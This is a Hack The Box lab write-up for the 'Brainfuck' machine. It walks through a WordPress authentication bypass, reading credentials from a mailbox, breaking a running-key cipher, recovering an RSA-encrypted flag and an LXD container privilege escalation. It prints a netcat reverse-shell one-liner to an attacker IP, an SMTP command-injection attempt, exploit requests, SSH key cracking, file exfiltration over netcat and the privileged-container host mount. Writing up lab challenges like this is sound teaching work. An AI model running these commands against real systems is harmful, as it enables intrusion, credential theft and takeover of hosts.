# Brainfuck [HTB](https://app.hackthebox.com/machines/17)
![brainfuck-01](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Brainfuck/img/brainfuck-01.png)


## Recon

After adding the target to my `/etc/hosts` file I start scanning for open ports:

```bash
nmap -p- --min-rate 10000 brainfuck.htb
```

![ports-02](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Brainfuck/img/ports-02.png)


Let's run a version detection scan againts the found ports:

```bash
nmap -p 22,25,110,143,443 -sCV brainfuck.htb -oN nmap.results
```

![nmap-res-03](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Brainfuck/img/nmap-res-03.png)
![nmap-res-04](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Brainfuck/img/nmap-res-04.png)

We have the following:

+ An SSH server on port 22.
+ An SMTP server on port 25.
+ POP3 service on port 110.
+ IMAP service on port 143.
+ An Nginx/1.10.0 server on port 443.


The target seems to be using a common email configuration where it has SMTP acting as the email server, and IMAP/POP3 acting as the email client. It looks like nmap's probing scripts couldn't connect to the SMTP server on port 25 directly, but they did manage to identify the POP3 and IMAP clients as `Dovecot`. 


The next interesting service the target is running is HTTPS. Based on the SSL certificate of the server we can identify the common name as `brainfuck.htb`, this is the domain I added initially to the `/etc/hosts` file which is good. But we also see two new sub-domains of `www.brainfuck.htb` and `sup3rs3cr3t.brainfuck.htb` as alternative names. I mapped both of these new sub-domains to the external IP of the target in my `/etc/hosts` file.  



Let's take a look at the email server.


### SMTP, POP3 & IMAP Ports 25, 110 & 143


If we search online for the term [Dovecot](https://en.wikipedia.org/wiki/Dovecot_(software)), we will find that it is an open-source IMAP and POP3 server for Unix-like operating systems. The primary purpose of `Dovecot` is to act as a mail storage server. The mail is delivered to the server using some mail delivery agent (MDA) and is stored for later access with an email client (mail user agent, or MUA).


If we lookup exploits for this software online, we will find a possible [RCE vulnerability](https://www.exploit-db.com/exploits/25297), due to a common misconfiguation when Dovecot is used as the local delivery agent by the Exim SMTP server. 


I'm not going to cover the vulnerability in detail, as the specifics can be found in the above link. But testing for the exploit is fairly trivial. All we have to do is inject commands into the `MAIL FROM` field of an email request to a valid recipient on the SMTP server. If the server is vulnerable the commands should execute.


Here is the setup:


I create a reverse shell script on my Kali machine and host it up via a python web server:

```bash
echo "rm -f /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.54 443 >/tmp/f" > htb.sh
chmod +x htb.sh
python3 -m http.server 80
```

Then, I connect to the SMTP server and send an email as such:

![email-05](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Brainfuck/img/mail-05.png)


The `orestis@brainfuck.htb` address I got from the Nginx server which I will show later, but in general this is how you would exploit this. 


The main issue is that right at the top, based on the SMTP banner we can tell this is not an Exim SMTP server, but rather a Postfix server. An Exim banner looks somehitng like this `220 host ESMTP Exim 4.72 ...`. 


The other issue is that even though my email was accepted, I dont see any requests to my python server to retrive the `htb.sh` script. 


At this point I deicded to bail on this vulnerability, I tried searching for other possible exploits for the `Dovecot` software but I didn't find anything super useful. 


In terms of SMTP/POP3/IMAP specific enumeration, there are stuff we can do, like trying to brute force credentials of users on the email server, then trying to pull thier email queues, but I don't think it's the correct way forward. The Nginx server looks much more intersting, and we have some leads on it which I will show right now. 


Let's check it out! 


## Nginx Port 443


When I was trying to pull off the previous RCE exploit, I needed a valid recipent address to send the email to. So I decided look for clues in the Nginx server. If we browse towards `https://brainfuck.htb/` we see the following:

![site-06](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Brainfuck/img/site-06.png)


This is where I got the email address of `orestis@brainfuck.htb`. It also looks like this user is an admin on this WordPress site. My `Weppalayzer` also idnetifies this to be a WordPress site. 


On the main page there are a few links, There is the `Open Ticket` and `Sample Page` links at the upper strip, and down at the buttom there is a `Log In` link:

![login-07](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Brainfuck/img/login-07.png)


As you can see in the above screenshot, there are two more links in this window, `Entries RSS` and `Comments RSS`, both lead to the same file which reads as such:

![rss-file-08](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Brainfuck/img/rss-file-08.png)


This looks like a generic informational file from WordPress, but the juciy piece of information here is the WordPress version which is `4.7.3`. If we search online, we can find a [password reset vulnerability](https://www.exploit-db.com/exploits/41963) for this version.


In short, we can abuse the reset password function of the WordPress login form, to make the server send a reset link to an email server we control using the `Host` HTTP header. 


Trying to pull this off is fairly trivial as well, all I did is start a local lisetner on my Kali machine on port 25 using `nc -lnvp 25`. Then, I sent the following request to the target:

```bash
curl -k -X POST https://brainfuck.htb/wp-login.php?action=lostpassword -H 'Host: 10.10.14.54' -H 'Content-Type:  application/x-www-form-urlencoded' -H 'Content-Length: 56' -F 'user_login=admin' -F 'redirect_to=' -F 'wp-submit=Get+New+Password' 
```

This resulted in a 404 response form the server:

![err-09](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Brainfuck/img/err-09.png)


So instead, I tried to use the actual form, and send a legitimate request for a password reset, without modifying any headers:

![request-10](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Brainfuck/img/request-10.png)


We can see that the server got an internal server error, the reason? 

![reason-11](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Brainfuck/img/reason-11.png)


The `email()` function has been disabled on the target server. And based on the previous error, we know that we need to pass a valid domain name to the `Host` header as our email server, an IP address will not suffice. So how will this box resolve our malicious domain name? This is not the way forward. 


At this point I decided to shift gears and use `wpscan` as such:

```bash
wpscan --disable-tls-checks --url https://brainfuck.htb/
```

![wpscan-12](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Brainfuck/img/wpscan-12.png)


Out of all of the scan result I found the above plugin to be the most interesting. If we lookup for vulnerabilities for this plugin, we can find an [authnitcation bypass vulnerability](https://www.exploit-db.com/exploits/41006) on ExploitDB for this exact version.


According to the vulnerability, the `/wp-admin/admin-ajax.php` script doesn't properly check for `wp_set_auth_cookie()`, which enables complete authintaiction bypass for any user if we submit the following form:

```html
<form method="post" action="http://wp/wp-admin/admin-ajax.php">
	Username: <input type="text" name="username" value="administrator">
	<input type="hidden" name="email" value="sth">
	<input type="hidden" name="action" value="loginGuestFacebook">
	<input type="submit" value="Login">
</form>
```


If we run `curl -k https://brainfuck.htb/wp-admin/admin-ajax.php` we can see the following:

![curl-13](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Brainfuck/img/curl-13.png)


This proves that the `/wp-admin/admin-ajax.php` file exsits on the target. Though Im not sure what's the meaning of this zero. 


If we follow along the exploit notes, to pull this off we need to send a request like this:

![request-14](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Brainfuck/img/request-14.png)


Note that I've changed the username from `administrator` to `admin`, as this was the noted user account in the site's main page. And as you can see in the response, we got a cookie of `wordpress_logged_in` for the admin user! 


So if we browse towards `https://brainfuck.htb/wp-admin/` we should get access to the admin panel:

![wp-admin-15](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Brainfuck/img/wp-admin-15.png)


We are in! 


### WordPress Admin


Once inside the WordPress I tried getting a shell by changing the contents of the `404.php` file for the Twenty Fifteen theme with [pentestmonkeys](https://github.com/pentestmonkey/php-reverse-shell) php reverse shell script. This is a common way of exploitng WordPress admin access to get a shell on the target system. Unfortunately we dont have write permissions to edit themes.


So instead, I tried to upload a malicious plugin that I created, which had a reverse shell payload embedded inside. But the plugin upload feature has been disabled completely!  


At this point I wasn't sure what to do, so I started clicking around the admin panel, looking into every page. In the `Settings` tab I found the `Easy WP SMTP` section which had the following:

![wp-easy-smtp-16](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Brainfuck/img/wp-easy-smtp-16.png)


This looked interesting, from my research online I found that the `Easy WP SMTP` plugin in a way to integrate WordPress with your email server. Allowing you to receive informational emails and upload stuff to your site via email, pretty cool. 


This settings page seems to be storing the credentials to the email server. The password is hidden, but if we right click on it, and select `inspect` we will get the HTML tag in the source code which holds the value of this password in clear text:

![clear-text-17](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Brainfuck/img/clear-text-17.png)


The settings page of `Easy WP SMTP` also has the details of the email server to connect to. Here we see port 25 of the localhost on the target.


But if we use `telnet` to conenct to the SMTP server on the target and try to login, we will see that authintication has been disabled:

![smtp-no-auth-18](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Brainfuck/img/smtp-no-auth-18.png)


Ok... Instead I tried to login to the POP3 server using the found credentials:

![pop3-auth-19](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Brainfuck/img/pop3-auth-19.png)


It worked! 


From here we can list the numbers of emails in the `orestis`'s queue using the `STAT` command:

![stat-20](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Brainfuck/img/stat-20.png)


The `orestis` user has three emails. We can read each email by running `RETR <num>`, where `<num>` is the email number. Here is the breakdown of the emails:


+ The first email is an automated email from WordPress after successfully setting up the site at `https://brainfuck.htb`. Nothing too important. 


+ The third email is from the initial RCE exploit we tried to pull of in the beginning:

![third-21](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Brainfuck/img/third-21.png)


+ But the second email is from root, and it's the most useful. Here we see credentials for a `secret` forum:

![secret-creds-22](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Brainfuck/img/secret-creds-22.png)


We know we had a sub-domain of `sup3rs3cr3t.brainfuck.htb` from the initial nmap scan, they are probably referring to that. But I also tried to connect to the SSH with these credentials and I recived the following error:

![ssh-err-23](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Brainfuck/img/ssh-err-23.png)


This means that the target server is only interested in key based authintication, and since we dont have a public key which is acceptable by the server, we get this error message. 


Let's check this secret forum! 


### sup3rs3cr3t.brainfuck.htb


If we browse towards `https://sup3rs3cr3t.brainfuck.htb/` we see the following:

![forum-24](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Brainfuck/img/forum-24.png)


At the top right there is a login button. After logging in using the credentials we found from `orestis`'s email, we see the following: 

![inside-25](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Brainfuck/img/inside-25.png)


These look like chat channels. 


If we go to the `SSH Access` channel, we see the following exchange:

![channel-26](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Brainfuck/img/channel-26.png)


The message order here is from top to buttom, meaining that the messages at the top are the oldest, and the buttom most messages are the recent ones. 


We are logged in as `orestis`, but there is also an `admin` on this server. 


This `admin` user confirms that password based authentication to the SSH server has been disabled for the benefit of using key based authintication. The `orestis` user complains that he lost he's SSH key, and starts another "encrypted" channel. 


`orestis` is referring the `Key` channel, and if we take a look at it we see the following:

![key-channel-27](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Brainfuck/img/key-channel-27.png)


One of the messages definitely stands out, as it looks like a url. Intersting. 


At this point I spent some time playing around with the unicode values of the cipher text in python. I thought that the "encryption" here s a simple unicode shift. So I started brute forcing unicod values to see if I can get a coherent sentence but I didn't. 


Insetad, I came to find that there isn't a consistent shift in unicode values, but rather a varied one. each character seems to be encoded differently. 


For example, we know that the URL should start with `https`, but in the cipher text we see `mnvze`. Shouldn't the values for the `tt` in `https` also be the same in the cipher? 


Another point where this is visible is with our `orestis`'s signiture, we know from the previous channel that `orestis` always sings he's message with `Orestis - Hacking for fun and profit`. But the ciher text for this string is different in every message, which means that the key is always different.


I decided to identify this cipher text, I tried different websites, until [this](https://www.cryptool.org/en/cto/ncid) site gave me the correct lead:

![lead-28](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Brainfuck/img/lead-28.png)


This site suggested that the cipher text I gave it (extracted from the admin's URL message), is actually a [Running Key](https://en.wikipedia.org/wiki/Running_key_cipher) cipher text. 


In short, `Running-Key` is a form of symetric encryption which uses a random string, liek sentences from books as the encryption key. The actual subsitutuion of the characters is achived using the following tableau:

![tableau-29](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Brainfuck/img/tableau-29.png)


There is another very important aspect to the running-key encrpyion, which is that the encryption key could also be derived from parts of the clear-text message to be encrypted! [source](https://sites.google.com/site/cryptocrackprogram/user-guide/cipher-types/substitution/running-key). 


This was the confirmation I needed that the chat server is encrypted with running key encryption. 


But how do we decrypt it? 


Well, we know for sure that the following cipher text is a URL: `mnvze://zsrivszwm.rfz/8cr5ai10r915218697i1w658enqc0cs8/ozrxnkc/ub_sja`, as it has the exact strucutre of a URL. We can also make an educated guess, that the creator of the box won't link to external resources, and that this in fact the actual target host at `https://brainfuck.htb`. 


If we check for the length of the encrypted domain `zsrivszwm.rfz`, we will find that it matches `brainfuck.htb` exactly. We can also see that the protocol section of the URL, has the length to match `https`, which is what our target is running. 


So now we have a part of the plain-text message to be encrypted, and it's equivalent cipher text. And we also know that the encrypion key should be comprised from some of the charecters in the URL. 


At this point I found the [following website](https://www.cachesleuth.com/runningkey.html), which simplies encrypting and decrypting text with running-key encryption.


At first, I started by inputting parts the cipher text, and guessing possible keys based on the equivalent clear-text parts of said cipher text. So for example, we know that `zsrivszwm` in cipher text is `brainfuck` in clear text, so I inputted both:

![initail-30](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Brainfuck/img/initial-30.png)


The result is the string `ybrainfuc` at the top.. OK something definitely happened.


Then I added the suffix of the domain which is `htb` in clear text, and `rfz` in cipher:

![step-two-31](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Brainfuck/img/step-two-31.png)


I think I'm on the right track, the result from the decrpyion is starting to form a sentence.


Next, I added the protocol section of the URL, which is `https` in clear text and `mnvze` is cipher:

![key-32](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Brainfuck/img/key-32.png)


It looks like the sentence is starting to repeat itself, could the encryption key be `fuckmybrain`? 


Let's try to decrypt the cipher URL with this key:

![url-33](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Brainfuck/img/url-33.png)


Looks like a valid URL! 


This must be the correct key, but there seems to be an issue with this running-key decoder, as the numbers from the original cipher text are missing. 


Running-key only encrypts characters, not numbers, so it makes since why this decoder removed the numbers, but we actually need them in order to get the valid link to the SSH key. 


I used [this site](https://www.dcode.fr/vigenere-cipher) to properly decrypt the cipher text using said key:

![true-link-34](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Brainfuck/img/true-link-34.png)


If we curl for this link we get the `orestis` SSH key:

```bash
curl -k https://brainfuck.htb/8ba5aa10e915218697d1c658cdee0bb8/orestis/id_rsa
```

![ssh-key-35](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Brainfuck/img/ssh-key-35.png)


We got the SSH key, but it seems to be encrypted, let's try to brute force the password. 


First, I save the SSH key on my attack machine and add the proper permissions to it using:

```bash
chmod 600 orestis_id_rsa
```` 


Then we can brute force it with `john` as such:

```bash
ssh2john orestis_id_rsa > orestis_id_rsa.hash
john orestis_id_rsa.hash --wordlist=/usr/share/wordlists/rockyou.txt
```

![cracked-36](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Brainfuck/img/cracked-36.png)


Here it is, the password for the SSH key is `3poulakia!`. 


Let's try to login to the SSH:

```bash
ssh -i orestis_id_rsa orestis@brainfuck.htb
```

![ssh-37](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Brainfuck/img/ssh-37.png)


## Privilege Escalation

If we take a look at the above screenshot, we will notice that `orestis` is a part of the `lxd` group. This gives our user the ability to start and control containers on the system. There is a common way to exploit this privilege, by mounting the host's entier filesystem inside a contorled container. Then, from inside the container since we have complete `root` privileges, we can travers the host filesystem at ease. 


Before pulling this off, I wanted to have a look at `orestis`'s home folder, that's where I saw the following:

![orestis-home-38](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Brainfuck/img/orestis-home-38.png)


This file caught my eye, so I decided to have a look at it:

![sage-39](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Brainfuck/img/sage-39.png)


This is clearly a python script based on the syntax, but there is some functions and methods here that I dont recognize, and I dont see any module imports so i'm not sure how its' working exactly. But the more important question is what is it doing? 


Here's is the overview of this script. 


The scripts starts by opening the root flag at `/root/root.txt`, changing it to hex, then turnning it into an integer and saving the result as the `m` varaible. The script also opens two files of `debug.txt` and `output.txt`, both are saved in the current working directory. 


Next, the script generates what seems like two prime numbers, these numbers are multipled together to give us the variable `n`. Then, the script uses a `ZZ.random_element` method to create the varaible `e`. I'm not sure exactly what this method is doing, but it doesn't really matter, and I will exaplain why in a bit.


With all the variables set, the script computs the `"Encrypted Password"` using `c = pow(m, e, n)` and writs the result to `output.txt`. Finally the prime numbers of `p` and `q`, along with the variable `e` are written into `debug.txt`.


So in other words, the script uses the numbers stored at `m`, `n`, and `e` to encrypt the root flag using a `pow()` operation.


This is obviously a puzzle to get the root flag, and we can definitely solve it! We won't get a shell from this, so the root shell we will get later with the `lxd` escalation. 


let's solve this puzzle! 


### Sage Puzzle


If we think about it, we have two main issues we need to solve to get the root flag:


+ 1) We need to find a way to reverse the `pow(m, e, n)` operation to get the value of `m`, which is the flag.

+ 2) We need to find a way to turn that integer value of `m` into hex, and then from hex back into a string. 


Let's start with the latter issue since it's fairly trivial. 


Let's open a python interpeter and start by defining a string as our password, hexifying it, then turnning it to integer. We can do this easily with the `binascii` python module

```python
>>> import binascii
>>> password = b'This is a sentence, which will be decrypted!!!'
>>> hex_password = binascii.hexlify(password)
>>> hex_password
b'5468697320697320612073656e74656e63652c2077686963682077696c6c20626520646563727970746564212121'
>>> int_password = int(hex_password, 16)
>>> int_password
198235451264309299023378144067345482602437222956107066802195822037906031743351405218385962488990061729679483169
>>> 
```

This, in essence, is what the `encrypt.sage` script is doing to the contents of `/root/root.txt` on the target. 


So to turn `int_password` back into clear text, we need to reverse the operation. The only tricky part is how we will turn the integer into hex. I read different solutions for this issue online, some suggested using the `struct` python module, but this gave me issues with longer passwords. Instead I found a simple, pure python way of transfering the integer into hex using the `format` function as such:

```python
>>> hex_pass = '{:x}'.format(int_password).encode('utf-8') # We need to encode before passing it to binascii
>>> hex_pass
b'5468697320697320612073656e74656e63652c2077686963682077696c6c20626520646563727970746564212121'
>>> clear_pass = binascii.unhexlify(hex_pass).decode('utf-8') # Decode to get a clear string
>>> clear_pass
'This is a sentence, which will be decrypted!!!'
>>> 
```

As you can see, we were able to retrive the original text after hexifying it and turnning it into an intger. I encourage you to try this out yourself! 


Now let's talk about the latter issue, reversing the `c = pow(m, e, n)` operation to get the value of `m`. First, let's start with what is the `pow()` function in python. 


This is very simple, the `pow()` function in python takes two arguments, raising the value of first argument to the power of the second argument and returns the product. For example `pow(2,2)` is: `2**2 = 4`. So far so good. 


However, the `pow()` function can also take a third argument, dividing the result of the initial power operation by the value of the third argument and returning the remainder of the devision. For eaxmple, `pow(2,2,3)` is: `(2**2) % 3` which is `4 % 3 = 1`. The `%` operator is called `modulo`, and it returns the remainder of a devision operation. 


This is how the `encrypt.sage` script "encrypts" the root flag. The issue with this script is that it saves the values of all of the varaibles used in the calculation! The values of the prime numbers, `p` and `q` are saved into `debug.txt`, along with the value of `e`. Then, the result of `c`, which is the final product is saved into the `result.txt` file. 


So from the operation `c = pow(m, e, n)`, we have all the values execpt for `m` which is the root flag. This is everything we need to reverse the operation and get the inital value of `m`.


How do we do this? 


I did a bit of research online and I found [this perfect StackOverflow](https://stackoverflow.com/questions/49856115/inverse-of-a-powa-b-n-function-in-python-decryption-code?noredirect=1&lq=1) thread, which fites our probalm like a glove. 


They say that in order to reverse the `pow(m, e, n)` operarion, we need to use the values of the prime numbers (`q` and `p`) along with the value of `e`, and pass them into an [Extended Euclidian Algorithm](https://en.wikipedia.org/wiki/Extended_Euclidean_algorithm), in order to calculate a value of `x`.


This can be achived using the following function:

```python
def egcd(a, b):
    x,y, u,v = 0,1, 1,0
    while a != 0:
        q, r = b//a, b%a
        m, n = x-u*q, y-v*q
        b,a, x,y, u,v = a,r, u,v, m,n
    gcd = b
    return gcd, x, y
```

To use it we need to invoke it as such:

```python
# c = pow(m, e, n)
gcd, x, y = egcd(e, (p-1)*(q-1))
```

Once we have this `x` value, we can get the value of the `m` variable using a simple `pow()` operation:

```python
pow(c, x, n)
```


Let's try this out! 


Firt, we need to transfer the files `debug.txt` and `output.txt` to our attack machine. To do this, I setup a simple netcat listener on my attack machine, which redirects the input into a file:

```bash
nc -lnvp 23 > debug.txt
```

Then from the target, I `cat` out the value of `debug.txt` and pipe it to netcat:


```bash
cat debug.txt > nc 10.10.14.54 23
```

I repeat the process for both files, and now I have them both on my attack machine:

![files-40](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Brainfuck/img/files-40.png)


Now it's time to build a script. 


First, we need to parse out the values of the variables used in the encryption from the files. Then we need to implement the extended euclidean algorithm and use it to get the value of `m`. And finally we need to turn the value of `m` back into a string.


All in all I came up with this script:

```python
#!/usr/bin/python3
import binascii                                        

def egcd(a, b):
    x,y, u,v = 0,1, 1,0
    while a != 0:
        q, r = b//a, b%a
        m, n = x-u*q, y-v*q
        b,a, x,y, u,v = a,r, u,v, m,n
    gcd = b
    return gcd, x, y


with open('debug.txt', 'rt') as file:
    lines = file.readlines()
    p = int(lines[0])
    q = int(lines[1])
    e = int(lines[2])
    n = p*q

with open('output.txt', 'rt') as file:
    t = file.read().strip().split(' ')
    c = int(t[-1])


# c = pow(m, e, n)

gcd, x, y = egcd(e, (p-1)*(q-1))

enc_pass = pow(c, x, n)

hex_enc_pass = '{:x}'.format(enc_pass).encode('utf-8')

password = binascii.unhexlify(hex_enc_pass).decode('utf-8')

print(password)
```


If we run it we get the following:

![flag-41](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Brainfuck/img/flag-41.png)


This is in fact the root flag, and it was accepted by HTB to give me the conformation that I've solved the box. But I will prove that this is the root flag later on once we get the root shell.


All in all this is was a very fun challange and I enjoyed solving it very much, but it's not a root shell. 


Let's fix that!


### LXD Escalation


When I solved [Tabby](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Tabby/Tabby.MD) I had pulled off an LXD privesc using a full Alpine container image. After reading `0xdf`'s writeup for Tabby, he introduced me to a way of pulling this off with a stipped down container image that's was just a 656 byets long! 


This is actually a method created by `M0NOC` and you can find the action plan [here](https://blog.m0noc.com/2018/10/lxc-container-privilege-escalation-in.html?m=1). Let's try this out!


The pull this off, we need to reengineer the [busybox container image](https://hub.docker.com/_/busybox). I decided to do this on a Ubuntu VM I have. To be able to download the container image, and to have all the tools needed for the reengineering, we need to download a couple of command-line tools:


```bash
apt install docker.io
apt install lxc-utils
```

Once you have these tools, you can download the busybox container image using:

```bash
docker pull busybox
```

Then, create a template container using:

```bash
lxc-create HTB -t busybox
lxc-ls -f	# list containers
```

![lxc-ls-42](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Brainfuck/img/lxc-ls-42.png)


The actual container is at `/var/lib/lxc/HTB/rootfs`, and we need to make a copy of this filesystem using:

```bash
cd /var/lib/lxc/HTB/
tar cfj ~/busyboxOrig.tar.bz2 rootfs
cd ; mkdir container ; cd containertar
tar xfj ../busyboxOrig.tar.bz2 
ls
``` 

![ls-43](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Brainfuck/img/ls-43.png)


The next step is to make a minimal yaml metadata file for `lxc`:

```bash
echo architecture: x86_64 > metadata.yaml
echo creation_date: 1424284563 >> metadata.yaml
cat metadata.yaml
```

![yaml-44](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Brainfuck/img/yaml-44.png)


Now we have a temporary working image, but we want to shrink it as much as possible! 


The first we are going to do is replace `/sbin/init` (the program lxc will run) with a symbloic link to the host's busybox. 


So in the container we need to run the following:

```bash
cd rootfs/sbin
rm init
ln -s ../../bin/busybox init
```

![rm-init-45](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Brainfuck/img/rm-init-45.png)


The next step will be to remove all the junk from the container that we don't need:

```bash
cd rootfs
rm home mnt selinux
rm -r usr bin lib lib64
for a in usr bin lib lib64; do ln -s ./r/$a; done  
```

![rootfs-46](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Brainfuck/img/rootfs-46.png)


Now we can create the final container image using:

```bash
cd container 
tar cfj ../htbFinal.tar.bz2 rootfs metadata.yaml
cd ..
ls -l htbFinal.tar.bz2 
```

![final-47](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Brainfuck/img/final-47.png)


My container image endded up being about 1050 byts instead of 656, maybe busybox changed their contianer image from when `M0NOC` wrote the action plan? Anyway I'll take it! 


Now it's time to transfer the archive over to the target. To do that we can base64 encode this archive:

```bash
base64 -w 0 htbFinal.tar.bz2 ; echo
```

![encode-48](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Brainfuck/img/encode-48.png)


Then we can copy the entire base64 string and decode it on the target system using:

```bash
echo <base64> | base64 -d > orestis.tar.bz2
```

![decode-49](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Brainfuck/img/decode-49.png)


Here is our archive on the target:

![on-target-50](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Brainfuck/img/on-target-50.png)


Now we are ready to pull of the exploit! 

```bash
lxc image import orestis.tar.bz2 --alias orestisImage
lxc init orestisImage orestisVM -c security.privileged=true
lxc config device add orestisVM realRoot disk source=/ path=r
lxc start orestisVM
lxc exec orestisVM -- /bin/sh
```

![root-51](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Brainfuck/img/root-51.png)


It worked!!! 


By the way, here is the proof that the root flag matches what we solved earlier:

![matches-51.5](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Brainfuck/img/matches-51.5.png)


From here we can acess the host filesystem at `r/` :

!fs-52](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Brainfuck/img/fs-52.png)
